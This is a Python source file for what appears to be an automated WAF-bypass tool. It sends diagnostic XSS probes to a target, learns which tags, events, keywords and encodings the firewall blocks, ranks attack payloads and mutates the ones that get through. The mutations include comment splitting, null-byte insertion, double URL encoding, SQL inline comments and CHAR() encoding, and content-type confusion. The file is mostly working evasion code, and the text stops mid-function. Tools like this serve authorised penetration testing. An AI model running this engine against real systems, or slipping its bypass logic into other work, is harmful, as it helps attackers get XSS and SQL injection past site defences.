#!/usr/bin/env python3
"""
Adaptive Payload Evolution Engine — fewer requests, more impact.

Not AI hype — pattern analysis on actual WAF responses:
  1. Probe phase: send diagnostic payloads to fingerprint WAF behavior
  2. Pattern analysis: learn what triggers blocks (tags, events, keywords)
  3. Smart selection: skip payloads that match blocked patterns
  4. Mutation: generate bypass variants of payloads that passed
  5. Result: 60-80% fewer requests, higher bypass discovery rate
"""

import re
import random
from typing import Dict, List, Set, Tuple
from dataclasses import dataclass, field


# ── WAF Behavior Fingerprint ────────────────────────────────────────────────

@dataclass
class WAFProfile:
    """Learned WAF behavior from probe responses."""
    # What the WAF blocks
    blocked_tags: Set[str] = field(default_factory=set)       # <script>, <svg>, <img>
    blocked_events: Set[str] = field(default_factory=set)     # onerror, onload, onclick
    blocked_keywords: Set[str] = field(default_factory=set)   # alert, eval, document
    blocked_patterns: Set[str] = field(default_factory=set)   # javascript:, data:, expression(
    blocked_encodings: Set[str] = field(default_factory=set)  # base64, unicode, hex

    # What the WAF allows
    allowed_tags: Set[str] = field(default_factory=set)
    allowed_events: Set[str] = field(default_factory=set)
    allowed_keywords: Set[str] = field(default_factory=set)

    # Response patterns
    block_status: int = 403                 # HTTP status when blocked
    block_signature: str = ""               # Response body pattern when blocked
    baseline_status: int = 200              # Normal response status
    baseline_length: int = 0                # Normal response body length
    blocks_by_length: bool = False          # WAF returns different length when blocking

    # Metadata
    total_probes: int = 0
    total_blocked: int = 0
    waf_vendor: str = ""

    @property
    def block_rate(self) -> float:
        return (self.total_blocked / self.total_probes * 100) if self.total_probes > 0 else 0

    @property
    def strictness(self) -> str:
        """Classify WAF strictness level."""
        rate = self.block_rate
        if rate >= 95:
            return "strict"
        elif rate >= 70:
            return "moderate"
        elif rate >= 30:
            return "permissive"
        else:
            return "minimal"


# ── Diagnostic Probes ────────────────────────────────────────────────────────

# Minimal set of probes that reveal WAF behavior with fewest requests.
# Each probe tests a specific signal. The result tells us what to skip.

DIAGNOSTIC_PROBES = [
    # Phase 1: Baseline (2 requests)
    {"id": "baseline-clean", "payload": "hello world test123",
     "tests": "baseline", "signal": "What does a clean request look like?"},
    {"id": "baseline-html", "payload": "<b>bold</b>",
     "tests": "basic_html", "signal": "Does WAF block ANY HTML at all?"},

    # Phase 2: Tag detection (4 requests — core tags)
    {"id": "tag-script", "payload": "<script>1</script>",
     "tests": "tag:script", "signal": "Blocks <script> tag?"},
    {"id": "tag-svg", "payload": "<svg>1</svg>",
     "tests": "tag:svg", "signal": "Blocks <svg> tag?"},
    {"id": "tag-img", "payload": "<img src=x>",
     "tests": "tag:img", "signal": "Blocks <img> tag?"},
    {"id": "tag-iframe", "payload": "<iframe>",
     "tests": "tag:iframe", "signal": "Blocks <iframe> tag?"},

    # Phase 3: Event handlers (3 requests)
    {"id": "event-onerror", "payload": "onerror=x",
     "tests": "event:onerror", "signal": "Blocks onerror keyword (no tag)?"},
    {"id": "event-onload", "payload": "onload=x",
     "tests": "event:onload", "signal": "Blocks onload keyword (no tag)?"},
    {"id": "event-combo", "payload": "<img src=x onerror=alert(1)>",
     "tests": "combo:img+onerror+alert", "signal": "Blocks tag+event+function combo?"},

    # Phase 4: Keywords (3 requests)
    {"id": "kw-alert", "payload": "alert(1)",
     "tests": "keyword:alert", "signal": "Blocks alert() alone?"},
    {"id": "kw-eval", "payload": "eval('x')",
     "tests": "keyword:eval", "signal": "Blocks eval() alone?"},
    {"id": "kw-document", "payload": "document.cookie",
     "tests": "keyword:document", "signal": "Blocks document.cookie?"},

    # Phase 5: Protocol/pattern (2 requests)
    {"id": "proto-javascript", "payload": "javascript:void(0)",
     "tests": "pattern:javascript:", "signal": "Blocks javascript: protocol?"},
    {"id": "proto-data", "payload": "data:text/html,<h1>x</h1>",
     "tests": "pattern:data:", "signal": "Blocks data: protocol?"},

    # Phase 6: Encoding tolerance (3 requests)
    {"id": "enc-entity", "payload": "&lt;script&gt;alert(1)&lt;/script&gt;",
     "tests": "encoding:html_entity", "signal": "Blocks HTML entity encoded payloads?"},
    {"id": "enc-unicode", "payload": "\\u003cscript\\u003ealert(1)",
     "tests": "encoding:unicode", "signal": "Blocks unicode escaped payloads?"},
    {"id": "enc-case", "payload": "<ScRiPt>alert(1)</sCrIpT>",
     "tests": "encoding:mixed_case", "signal": "Blocks mixed-case evasion?"},
]


def run_probes(tester, param: str = 'input') -> WAFProfile:
    """Send diagnostic probes and build a WAF behavior profile.

    Args:
        tester: WAFTester instance (already configured with target)
        param: URL parameter name to inject into

    Returns:
        WAFProfile with learned behaviors
    """
    profile = WAFProfile()

    for probe in DIAGNOSTIC_PROBES:
        result = tester.test_payload(probe["payload"], param=param)
        blocked = result.get("blocked", False)
        status = result.get("status", 0)
        resp_len = result.get("response_length", 0)
        profile.total_probes += 1

        if probe["id"] == "baseline-clean":
            profile.baseline_status = status
            profile.baseline_length = resp_len
            continue

        if blocked:
            profile.total_blocked += 1
            profile.block_status = status

        test_type = probe["tests"]

        # Baseline HTML check
        if test_type == "basic_html":
            if not blocked:
                # WAF doesn't block basic HTML — probably very permissive
                profile.allowed_tags.add("b")
            continue

        # Tag probes
        if test_type.startswith("tag:"):
            tag = test_type.split(":")[1]
            if blocked:
                profile.blocked_tags.add(tag)
            else:
                profile.allowed_tags.add(tag)

        # Event handler probes
        elif test_type.startswith("event:"):
            event = test_type.split(":")[1]
            if blocked:
                profile.blocked_events.add(event)
            else:
                profile.allowed_events.add(event)

        # Combo probe
        elif test_type.startswith("combo:"):
            if blocked and not profile.blocked_tags and not profile.blocked_events:
                # Only blocks combos, not individual parts
                profile.blocked_patterns.add("tag+event+function")

        # Keyword probes
        elif test_type.startswith("keyword:"):
            kw = test_type.split(":")[1]
            if blocked:
                profile.blocked_keywords.add(kw)
            else:
                profile.allowed_keywords.add(kw)

        # Pattern probes
        elif test_type.startswith("pattern:"):
            pattern = test_type.split(":")[1]
            if blocked:
                profile.blocked_patterns.add(pattern)

        # Encoding probes
        elif test_type.startswith("encoding:"):
            enc = test_type.split(":")[1]
            if blocked:
                profile.blocked_encodings.add(enc)

        # Length-based detection check
        if not blocked and profile.baseline_length > 0:
            if abs(resp_len - profile.baseline_length) > profile.baseline_length * 0.5:
                profile.blocks_by_length = True

    return profile


# ── Payload Scoring ──────────────────────────────────────────────────────────

def _extract_tags(payload: str) -> Set[str]:
    """Extract HTML tags from a payload."""
    return set(re.findall(r'<(\w+)[\s/>]', payload.lower()))


def _extract_events(payload: str) -> Set[str]:
    """Extract event handlers from a payload."""
    return set(re.findall(r'(on\w+)\s*=', payload.lower()))


def _extract_keywords(payload: str) -> Set[str]:
    """Extract known dangerous keywords from a payload."""
    kw_patterns = ['alert', 'eval', 'document', 'window', 'cookie',
                   'fetch', 'xmlhttp', 'prompt', 'confirm', 'constructor']
    found = set()
    lower = payload.lower()
    for kw in kw_patterns:
        if kw in lower:
            found.add(kw)
    return found


def _extract_patterns(payload: str) -> Set[str]:
    """Extract protocol/pattern signatures from a payload."""
    found = set()
    lower = payload.lower()
    for pattern in ['javascript:', 'data:', 'vbscript:', 'expression(']:
        if pattern in lower:
            found.add(pattern)
    return found


def score_payload(payload_str: str, profile: WAFProfile) -> Tuple[float, str]:
    """Score a payload's likelihood of bypassing the WAF.

    Returns:
        (score, reason) — higher score = more likely to bypass.
        Score 0.0 = almost certainly blocked, skip it.
        Score 1.0 = good bypass candidate.
    """
    if profile.strictness == "minimal":
        # WAF barely blocks anything — all payloads are equally fine
        return (0.8, "minimal WAF")

    tags = _extract_tags(payload_str)
    events = _extract_events(payload_str)
    keywords = _extract_keywords(payload_str)
    patterns = _extract_patterns(payload_str)

    score = 1.0
    reasons = []

    # Penalty: uses tags the WAF blocks
    blocked_tag_overlap = tags & profile.blocked_tags
    if blocked_tag_overlap:
        score -= 0.4 * len(blocked_tag_overlap)
        reasons.append(f"uses blocked tag(s): {blocked_tag_overlap}")

    # Bonus: uses tags the WAF allows
    allowed_tag_overlap = tags & profile.allowed_tags
    if allowed_tag_overlap:
        score += 0.1 * len(allowed_tag_overlap)
        reasons.append(f"uses allowed tag(s): {allowed_tag_overlap}")

    # Penalty: uses events the WAF blocks
    blocked_event_overlap = events & profile.blocked_events
    if blocked_event_overlap:
        score -= 0.3 * len(blocked_event_overlap)
        reasons.append(f"uses blocked event(s): {blocked_event_overlap}")

    # Bonus: uses events the WAF allows
    allowed_event_overlap = events & profile.allowed_events
    if allowed_event_overlap:
        score += 0.15 * len(allowed_event_overlap)
        reasons.append(f"uses allowed event(s): {allowed_event_overlap}")

    # Penalty: uses keywords the WAF blocks
    blocked_kw_overlap = keywords & profile.blocked_keywords
    if blocked_kw_overlap:
        score -= 0.2 * len(blocked_kw_overlap)
        reasons.append(f"uses blocked keyword(s): {blocked_kw_overlap}")

    # Penalty: uses patterns the WAF blocks
    blocked_pattern_overlap = patterns & profile.blocked_patterns
    if blocked_pattern_overlap:
        score -= 0.3 * len(blocked_pattern_overlap)
        reasons.append(f"uses blocked pattern(s): {blocked_pattern_overlap}")

    # Bonus: encoding evasion that WAF doesn't catch
    if 'html_entity' not in profile.blocked_encodings:
        if '&' in payload_str and ';' in payload_str:
            score += 0.15
            reasons.append("uses HTML entities (WAF allows)")
    if 'unicode' not in profile.blocked_encodings:
        if '\\u' in payload_str:
            score += 0.15
            reasons.append("uses unicode escapes (WAF allows)")
    if 'mixed_case' not in profile.blocked_encodings:
        if any(c.isupper() and c.isalpha() for c in payload_str[1:5] if len(payload_str) > 5):
            if '<' in payload_str:
                score += 0.1
                reasons.append("uses mixed case (WAF allows)")

    score = max(0.0, min(1.0, score))
    reason = "; ".join(reasons) if reasons else "no blocked patterns detected"
    return (round(score, 2), reason)


def rank_payloads(payloads: List[Dict], profile: WAFProfile,
                  threshold: float = 0.2) -> List[Dict]:
    """Rank payloads by bypass likelihood, filtering out low-score ones.

    Args:
        payloads: list of payload dicts (must have 'payload' key)
        profile: learned WAF profile from probes
        threshold: minimum score to keep (0.0–1.0)

    Returns:
        Sorted list of payload dicts with 'evolve_score' and 'evolve_reason' added.
    """
    scored = []
    for p in payloads:
        payload_str = p.get("payload", p) if isinstance(p, dict) else p
        sc, reason = score_payload(payload_str, profile)
        entry = p.copy() if isinstance(p, dict) else {"payload": p}
        entry["evolve_score"] = sc
        entry["evolve_reason"] = reason
        if sc >= threshold:
            scored.append(entry)

    # Sort by score descending — best bypass candidates first
    scored.sort(key=lambda x: x["evolve_score"], reverse=True)
    return scored


# ── Payload Mutation Engine ──────────────────────────────────────────────────

class PayloadMutator:
    """Generate bypass variants of payloads that passed the WAF.

    Mutations are based on real WAF bypass techniques:
    - Encoding transforms (HTML entities, unicode, hex, base64)
    - Tag substitution (blocked tag → allowed tag)
    - Event handler swaps
    - Case mixing and null byte injection
    - Comment insertion to break pattern matching
    - Double encoding
    - SQL-specific: inline comments, CHAR() encoding, keyword case mixing,
      whitespace substitution, operator synonyms
    """

    def __init__(self, profile: WAFProfile, category: str = "xss"):
        self.profile = profile
        self.category = category.lower() if category else "xss"

    # Content-type confusion strategies return content_type metadata
    _CT_STRATEGIES = {"ct_json", "ct_multipart", "ct_xml", "ct_plain"}

    def mutate(self, payload: str, max_mutations: int = 5) -> List[Dict]:
        """Generate mutations of a payload based on WAF profile.

        Returns list of dicts. Standard mutations:
            {"payload": str, "mutation": str, "parent": str}
        Content-type confusion mutations add:
            {"...", "method": "POST", "content_type": str}
        """
        mutations = []
        seen = {payload}

        # Pick mutation strategies based on WAF behavior
        strategies = self._pick_strategies()

        for strategy_name, strategy_fn in strategies:
            if len(mutations) >= max_mutations:
                break
            try:
                # Content-type confusion: payload stays the same, delivery changes
                if strategy_name in self._CT_STRATEGIES:
                    ct_value = strategy_fn(payload)
                    # Dedup key includes content-type to avoid skipping
                    dedup_key = f"{payload}||ct:{ct_value}"
                    if dedup_key not in seen:
                        seen.add(dedup_key)
                        mutations.append({
                            "payload": payload,
                            "mutation": strategy_name,
                            "parent": payload[:60],
                            "method": "POST",
                            "content_type": ct_value,
                        })
                else:
                    variant = strategy_fn(payload)
                    if variant and variant not in seen:
                        seen.add(variant)
                        mutations.append({
                            "payload": variant,
                            "mutation": strategy_name,
                            "parent": payload[:60],
                        })
            except Exception:
                continue

        # Chained mutations: compose 2-3 strategies for strict WAFs
        # Single mutations often fail against modern WAFs that normalize
        # and re-check after decoding. Chaining defeats multi-layer parsing.
        if len(strategies) >= 2:
            chains = self._build_chains(strategies)
            for chain_name, chain_fns in chains:
                if len(mutations) >= max_mutations:
                    break
                try:
                    variant = payload
                    for fn in chain_fns:
                        variant = fn(variant)
                    if variant and variant != payload and variant not in seen:
                        seen.add(variant)
                        mutations.append({
                            "payload": variant,
                            "mutation": chain_name,
                            "parent": payload[:60],
                        })
                except Exception:
                    continue

        return mutations

    def _build_chains(self, strategies: list) -> list:
        """Build effective 2-3 mutation chains for strict WAF bypass.

        Not random combos — carefully ordered chains that exploit how
        WAFs parse in stages: normalize → pattern match → decode → re-check.
        """
        chains = []
        strat_map = {name: fn for name, fn in strategies}

        # Chain 1: comment_injection + case_randomize
        # Breaks pattern matching AND case-sensitive rules
        if "comment_injection" in strat_map and "case_randomize" in strat_map:
            chains.append((
                "comment+case",
                [strat_map["comment_injection"], strat_map["case_randomize"]],
            ))

        # Chain 2: comment_injection + double_url_encode
        # Comment breaks pattern, double-encode survives URL normalization
        if "comment_injection" in strat_map and "double_url_encode" in strat_map:
            chains.append((
                "comment+dblenc",
                [strat_map["comment_injection"], strat_map["double_url_encode"]],
            ))

        # Chain 3: case_randomize + null_byte_insert
        # Mixed case + null byte — defeats both case normalization and pattern matching
        if "case_randomize" in strat_map and "null_byte_insert" in strat_map:
            chains.append((
                "case+null",
                [strat_map["case_randomize"], strat_map["null_byte_insert"]],
            ))

        # Chain 4: html_entity_encode + comment_injection
        # Entity-encode critical chars, then break remaining patterns with comments
        if "html_entity_encode" in strat_map and "comment_injection" in strat_map:
            chains.append((
                "entity+comment",
                [strat_map["html_entity_encode"], strat_map["comment_injection"]],
            ))

        # Chain 5: triple — case + comment + double_url_encode
        # Full evasion stack for strictest WAFs
        if all(s in strat_map for s in ("case_randomize", "comment_injection", "double_url_encode")):
            chains.append((
                "case+comment+dblenc",
                [strat_map["case_randomize"], strat_map["comment_injection"],
                 strat_map["double_url_encode"]],
            ))

        # Chain 6: unicode_escape + comment_injection
        if "unicode_escape" in strat_map and "comment_injection" in strat_map:
            chains.append((
                "unicode+comment",
                [strat_map["unicode_escape"], strat_map["comment_injection"]],
            ))

        # Chain 7: tag_substitute + case_randomize + null_byte
        if all(s in strat_map for s in ("tag_substitute", "case_randomize", "null_byte_insert")):
            chains.append((
                "tagsub+case+null",
                [strat_map["tag_substitute"], strat_map["case_randomize"],
                 strat_map["null_byte_insert"]],
            ))

        # ── SQL-specific chains ────────────────────────────────────────

        # Chain S1: inline comment + case mix
        if "sql_inline_comment" in strat_map and "sql_case_mix" in strat_map:
            chains.append((
                "sql_comment+case",
                [strat_map["sql_inline_comment"], strat_map["sql_case_mix"]],
            ))

        # Chain S2: case mix + whitespace substitution
        if "sql_case_mix" in strat_map and "sql_whitespace_sub" in strat_map:
            chains.append((
                "sql_case+ws",
                [strat_map["sql_case_mix"], strat_map["sql_whitespace_sub"]],
            ))

        # Chain S3: inline comment + CHAR() encode
        if "sql_inline_comment" in strat_map and "sql_char_encode" in strat_map:
            chains.append((
                "sql_comment+char",
                [strat_map["sql_inline_comment"], strat_map["sql_char_encode"]],
            ))

        # Chain S4: triple — comment + case + whitespace
        if all(s in strat_map for s in ("sql_inline_comment", "sql_case_mix", "sql_whitespace_sub")):
            chains.append((
                "sql_comment+case+ws",
                [strat_map["sql_inline_comment"], strat_map["sql_case_mix"],
                 strat_map["sql_whitespace_sub"]],
            ))

        # Chain S5: synonym + double URL encode (cross-category)
        if "sql_keyword_synonym" in strat_map and "double_url_encode" in strat_map:
            chains.append((
                "sql_synonym+dblenc",
                [strat_map["sql_keyword_synonym"], strat_map["double_url_encode"]],
            ))

        return chains

    def _pick_strategies(self) -> list:
        """Select mutation strategies based on what the WAF does/doesn't block."""
        strategies = []
        p = self.profile

        # If WAF doesn't block HTML entities → encode blocked chars
        if "html_entity" not in p.blocked_encodings:
            strategies.append(("html_entity_encode", self._html_entity_encode))

        # If WAF doesn't block mixed case → case randomize
        if "mixed_case" not in p.blocked_encodings:
            strategies.append(("case_randomize", self._case_randomize))

        # If WAF doesn't block unicode → unicode escape
        if "unicode" not in p.blocked_encodings:
            strategies.append(("unicode_escape", self._unicode_escape))

        # Always try these — universal evasion techniques
        strategies.extend([
            ("comment_injection", self._comment_inject),
            ("null_byte_insert", self._null_byte_insert),
            ("double_url_encode", self._double_url_encode),
            ("whitespace_variation", self._whitespace_variation),
        ])

        # If some tags allowed but others blocked → tag substitution
        if p.allowed_tags and p.blocked_tags:
            strategies.append(("tag_substitute", self._tag_substitute))

        # If some events allowed → event swap
        if p.allowed_events:
            strategies.append(("event_swap", self._event_swap))

        # ── SQL-specific strategies ────────────────────────────────────
        if self.category in ("sqli", "sql", "sql-injection"):
            strategies.extend([
                ("sql_inline_comment", self._sql_inline_comment),
                ("sql_case_mix", self._sql_case_mix),
                ("sql_char_encode", self._sql_char_encode),
                ("sql_whitespace_sub", self._sql_whitespace_sub),
                ("sql_keyword_synonym", self._sql_keyword_synonym),
            ])

        # ── Content-type confusion strategies (universal) ────────────
        # These don't transform the payload — they change how it's delivered.
        # Marked with _CT_CONFUSION prefix so mutate() adds metadata.
        strategies.extend([
            ("ct_json", self._ct_json),
            ("ct_multipart", self._ct_multipart),
            ("ct_xml", self._ct_xml),
            ("ct_plain", self._ct_plain),
        ])

        return strategies

    # ── Mutation implementations ─────────────────────────────────────────

    def _html_entity_encode(self, payload: str) -> str:
        """Encode critical characters as HTML entities."""
        # Only encode the dangerous chars, not the whole payload
        result = payload
        for char, entity in [('<', '&lt;'), ('>', '&gt;'), ('"', '&quot;'),
                             ("'", '&#39;'), ('(', '&#40;'), (')', '&#41;')]:
            result = result.replace(char, entity)
        return result

    def _case_randomize(self, payload: str) -> str:
        """Randomize case of HTML tags and attributes."""
        result = []
        in_tag = False
        for c in payload:
            if c == '<':
                in_tag = True
            elif c == '>':
                in_tag = False
            if in_tag and c.isalpha():
                result.append(c.upper() if random.random() > 0.5 else c.lower())
            else:
                result.append(c)
        return ''.join(result)

    def _unicode_escape(self, payload: str) -> str:
        """Unicode-escape key characters."""
        replacements = {'a': '\\u0061', 'l': '\\u006c', 'e': '\\u0065',
                        'r': '\\u0072', 't': '\\u0074'}
        result = payload
        # Only replace within function names, not tags
        for old, new in replacements.items():
            # Replace first occurrence in function context
            if f'{old}lert' in result or f'a{old}' in result:
                result = result.replace(old, new, 1)
                break
        return result if result != payload else payload.replace('alert', '\\u0061lert')

    def _comment_inject(self, payload: str) -> str:
        """Insert HTML comments to break WAF pattern matching."""
        # Break up <script> → <scr<!---->ipt>
        if '<script' in payload.lower():
            return re.sub(r'(<scr)(ipt)', r'\1<!--X-->\2', payload, flags=re.IGNORECASE)
        # Break up onerror → on<!---->error
        if 'onerror' in payload.lower():
            return re.sub(r'(on)(error)', r'\1<!--X-->\2', payload, flags=re.IGNORECASE)
        # Break up alert → al<!---->ert
        if 'alert' in payload.lower():
            return re.sub(r'(al)(ert)', r'\1<!--X-->\2', payload, flags=re.IGNORECASE)
        return payload + '<!---->'

    def _null_byte_insert(self, payload: str) -> str:
        """Insert null bytes to confuse pattern matching."""
        if '<script' in payload.lower():
            return payload.replace('<script', '<scri%00pt', 1)
        if 'onerror' in payload.lower():
            return payload.replace('onerror', 'on%00error', 1)
        return payload[:len(payload)//2] + '%00' + payload[len(payload)//2:]

    def _double_url_encode(self, payload: str) -> str:
        """Double URL-encode critical characters."""
        result = payload
        for char, double_enc in [('<', '%253C'), ('>', '%253E'),
                                 ('(', '%2528'), (')', '%2529'),
                                 ('"', '%2522'), ("'", '%2527')]:
            result = result.replace(char, double_enc)
        return result

    def _whitespace_variation(self, payload: str) -> str:
        """Use alternative whitespace characters."""
        # Replace regular spaces with tabs, form feeds, or /
        alternatives = ['\t', '\x0c', '/']
        result = payload
        # Only replace spaces inside tags
        if '<' in result:
            # Replace first space after a tag name
            result = re.sub(r'(<\w+)\s', lambda m: m.group(1) + random.choice(alternatives),
                           result, count=1)
        return result

    def _tag_substitute(self, payload: str) -> str:
        """Replace blocked tags with allowed ones."""
        allowed = list(self.profile.allowed_tags - {'b'})  # Skip <b> as it's not useful for XSS
        if not allowed:
            return payload

        for blocked_tag in self.profile.blocked_tags:
            pattern = re.compile(f'<{blocked_tag}', re.IGNORECASE)
            if pattern.search(payload):
                replacement = random.choice(allowed)
                # Map tag-specific attributes
                result = pattern.sub(f'<{replacement}', payload)
                result = re.sub(f'</{blocked_tag}>', f'</{replacement}>',
                               result, flags=re.IGNORECASE)
                return result
        return payload

    def _event_swap(self, payload: str) -> str:
        """Replace blocked event handlers with allowed ones."""
        allowed = list(self.profile.allowed_events)
        if not allowed:
            return payload

        for blocked_event in self.profile.blocked_events:
            if blocked_event in payload.lower():
                replacement = random.choice(allowed)
                return re.sub(blocked_event, replacement, payload, flags=re.IGNORECASE)
        return payload

    # ── SQL-specific mutation implementations ──────────────────────────

    _SQL_KEYWORDS = re.compile(
        r'\b(SELECT|INSERT|UPDATE|DELETE|UNION|FROM|WHERE|AND|OR|ORDER|GROUP|'
        r'HAVING|LIMIT|DROP|ALTER|CREATE|EXEC|EXECUTE|INTO|VALUES|SET|JOIN|'
        r'LEFT|RIGHT|INNER|OUTER|LIKE|BETWEEN|IN|NOT|NULL|IS|AS|ON|CASE|'
        r'WHEN|THEN|ELSE|END|CONCAT|SUBSTR|SUBSTRING|ASCII|CHAR|SLEEP|'
        r'BENCHMARK|WAITFOR|DELAY|IF|EXISTS|ALL|ANY|TABLE|DATABASE|SCHEMA)\b',
        re.IGNORECASE,
    )

    def _sql_inline_comment(self, payload: str) -> str:
        """Insert inline SQL comments to break keyword pattern matching.

        UNION SELECT → UNI/**/ON SEL/**/ECT
        """
        def _split_keyword(m: re.Match) -> str:
            word = m.group(0)
            if len(word) <= 2:
                return word
            mid = len(word) // 2
            return word[:mid] + '/**/' + word[mid:]

        result = self._SQL_KEYWORDS.sub(_split_keyword, payload)
        return result if result != payload else payload

    def _sql_case_mix(self, payload: str) -> str:
        """Randomize case of SQL keywords.

        SELECT → SeLeCt, UNION → uNiOn
        """
        def _mix_case(m: re.Match) -> str:
            word = m.group(0)
            return ''.join(
                c.upper() if random.random() > 0.5 else c.lower()
                for c in word
            )

        return self._SQL_KEYWORDS.sub(_mix_case, payload)

    def _sql_char_encode(self, payload: str) -> str:
        """Encode string literals using CHAR() function.

        'admin' → CHAR(97,100,109,105,110)
        """
        def _encode_string(m: re.Match) -> str:
            s = m.group(1)
            if not s:
                return m.group(0)
            char_vals = ','.join(str(ord(c)) for c in s)
            return f'CHAR({char_vals})'

        # Match single-quoted string literals
        result = re.sub(r"'([^']{1,50})'", _encode_string, payload)
        return result if result != payload else payload

    def _sql_whitespace_sub(self, payload: str) -> str:
        """Replace spaces with alternative whitespace that WAFs may not normalize.

        Spaces → /**/, %09 (tab), %0a (newline), %0d (CR), +
        """
        alternatives = ['/**/', '%09', '%0a', '%0d', '+']
        result = payload
        # Replace up to 3 spaces (not all, to keep payload functional)
        count = 0
        parts = []
        for char in result:
            if char == ' ' and count < 3:
                parts.append(random.choice(alternatives))
                count += 1
            else:
                parts.append(char)
        return ''.join(parts)

    def _sql_keyword_synonym(self, payload: str) -> str:
        """Replace SQL operators and functions with synonyms.

        OR → ||, AND → &&, = → LIKE, CONCAT() → ||, spaces around operators
        """
        result = payload
        # Operator synonyms (applied one at a time to avoid over-mutation)
        synonyms = [
            (r'\bOR\b', '||'),
            (r'\bAND\b', '&&'),
            (r'\bUNION\s+SELECT\b', 'UNION ALL SELECT'),
            (r'\bSLEEP\s*\(', 'BENCHMARK(10000000,SHA1('),
            (r'\bSUBSTRING\s*\(', 'MID('),
            (r'\bCONCAT\s*\(', 'CONCAT_WS(\'\','),
        ]
        for pattern, replacement in synonyms:
            new_result = re.sub(pattern, replacement, result, count=1, flags=re.IGNORECASE)
            if new_result != result:
                return new_result
        return result

    # ── Content-type confusion implementations ────────────────────────
    # These methods return a content_type string, NOT a mutated payload.
    # mutate() handles them specially: payload stays the same, delivery changes.

    def _ct_json(self, payload: str) -> str:
        """Send payload in JSON body instead of form-urlencoded.
        Many WAFs only inspect form-urlencoded bodies."""
        return 'application/json'

    def _ct_multipart(self, payload: str) -> str:
        """Send payload as multipart/form-data.
        Boundary-based encoding confuses WAF pattern matchers."""
        return 'multipart/form-data'

    def _ct_xml(self, payload: str) -> str:
        """Send payload wrapped in XML body.
        WAFs that don't parse XML miss the payload entirely."""
        return 'text/xml'

    def _ct_plain(self, payload: str) -> str:
        """Send payload as text/plain.
        Some WAFs skip body inspection for non-standard content types."""
        return 'text/plain'


# ── Adaptive Test Runner ─────────────────────────────────────────────────────

@dataclass
class EvolveStats:
    """Statistics from an adaptive test run."""
    total_payloads_available: int = 0
    probes_sent: int = 0
    payloads_skipped: int = 0
    payloads_tested: int = 0
    mutations_generated: int = 0
    mutations_tested: int = 0
    mutations_bypassed: int = 0
    bypasses_found: int = 0
    requests_saved: int = 0

    @property
    def efficiency_gain(self) -> float:
        """Percentage of requests saved vs brute-force."""
        total_bruteforce = self.total_payloads_available
        total_smart = self.probes_sent + self.payloads_tested + self.mutations_tested
        if total_bruteforce == 0:
            return 0.0
        return round((1 - total_smart / total_bruteforce) * 100, 1)


def adaptive_test(tester, payloads: List[Dict], max_payloads: int = 50,
                  param: str = 'input', verbose: bool = True) -> Tuple[List[Dict], EvolveStats, WAFProfile]:
    """Run an adaptive payload test — probe, score, test, mutate.

    Args:
        tester: WAFTester instance
        payloads: full list of payloads to choose from
        max_payloads: max number of payloads to actually test (after scoring)
        param: URL parameter name
        verbose: print progress

    Returns:
        (results, stats, profile)
    """
    import time

    stats = EvolveStats()
    stats.total_payloads_available = len(payloads)

    if verbose:
        print(f"\n  \033[1mAdaptive Payload Evolution\033[0m")
        print(f"  Available payloads: {len(payloads)}")

    # ── Phase 1: Probe ───────────────────────────────────────────────────
    if verbose:
        print(f"\n  \033[94mPhase 1: Probing WAF ({len(DIAGNOSTIC_PROBES)} requests)...\033[0m")

    profile = run_probes(tester, param=param)
    stats.probes_sent = profile.total_probes

    if verbose:
        print(f"    Strictness: {profile.strictness} ({profile.block_rate:.0f}% probe block rate)")
        if profile.blocked_tags:
            print(f"    Blocked tags: {', '.join(sorted(profile.blocked_tags))}")
        if profile.allowed_tags:
            print(f"    Allowed tags: {', '.join(sorted(profile.allowed_tags))}")
        if profile.blocked_events:
            print(f"    Blocked events: {', '.join(sorted(profile.blocked_events))}")
        if profile.blocked_keywords:
            print(f"    Blocked keywords: {', '.join(sorted(profile.blocked_keywords))}")
        if profile.blocked_patterns:
            print(f"    Blocked patterns: {', '.join(sorted(profile.blocked_patterns))}")

    # ── Phase 2: Score & Rank ────────────────────────────────────────────
    if verbose:
        print(f"\n  \033[94mPhase 2: Scoring {len(payloads)} payloads...\033[0m")

    # Set threshold based on strictness
    threshold_map = {"strict": 0.3, "moderate": 0.2, "permissive": 0.1, "minimal": 0.0}
    threshold = threshold_map.get(profile.strictness, 0.2)

    ranked = rank_payloads(payloads, profile, threshold=threshold)
    stats.payloads_skipped = len(payloads) - len(ranked)

    if verbose:
        print(f"    Kept: {len(ranked)} payloads (skipped {stats.payloads_skipped} low-score)")

    # ── Phase 3: Test top-ranked payloads ────────────────────────────────
    test_count = min(len(ranked), max_payloads)
    if verbose:
        print(f"\n  \033[94mPhase 3: Testing top {test_count} payloads...\033[0m")

    results = []
    bypasses = []

    for i, p in enumerate(ranked[:test_count]):
        payload_str = p.get("payload", p) if isinstance(p, dict) else p
        result = tester.test_payload(payload_str, param=param)
        result["evolve_score"] = p.get("evolve_score", 0)
        result["evolve_reason"] = p.get("evolve_reason", "")
        results.append(result)
        stats.payloads_tested += 1

        if not result.get("blocked"):
            bypasses.append(result)
            stats.bypasses_found += 1

        if verbose:
            status_color = "\033[91m" if result["blocked"] else "\033[92m"
            status_text = "BLOCKED" if result["blocked"] else "BYPASS "
            score = p.get("evolve_score", 0)
            desc = p.get("description", "")[:30] if isinstance(p, dict) else ""
            print(f"    [{i+1}/{test_count}] {status_color}{status_text}\033[0m "
                  f"Score:{score:.1f} | Status:{result.get('status', 0)} | "
                  f"{desc or payload_str[:30]}")

        time.sleep(tester.delay)

    # ── Phase 4: Mutate successful bypasses ──────────────────────────────
    if bypasses and profile.strictness in ("moderate", "strict"):
        mutator = PayloadMutator(profile)
        max_mutations_per = 3
        mutation_budget = min(10, max_payloads - test_count)

        if mutation_budget > 0 and verbose:
            print(f"\n  \033[94mPhase 4: Generating mutations from {len(bypasses)} bypass(es)...\033[0m")

        mutation_results = []
        for bypass in bypasses[:3]:  # Mutate top 3 bypasses
            if mutation_budget <= 0:
                break
            parent_payload = bypass.get("payload", "")
            mutations = mutator.mutate(parent_payload, max_mutations=max_mutations_per)
            stats.mutations_generated += len(mutations)

            for mut in mutations:
                if mutation_budget <= 0:
                    break
                result = tester.test_payload(mut["payload"], param=param)
                result["mutation"] = mut["mutation"]
                result["parent_payload"] = mut["parent"]
                mutation_results.append(result)
                stats.mutations_tested += 1
                mutation_budget -= 1

                if not result.get("blocked"):
                    stats.mutations_bypassed += 1

                if verbose:
                    status_color = "\033[91m" if result["blocked"] else "\033[92m"
                    status_text = "BLOCKED" if result["blocked"] else "BYPASS "
                    print(f"    MUT {status_color}{status_text}\033[0m "
                          f"[{mut['mutation']}] Status:{result.get('status', 0)}")

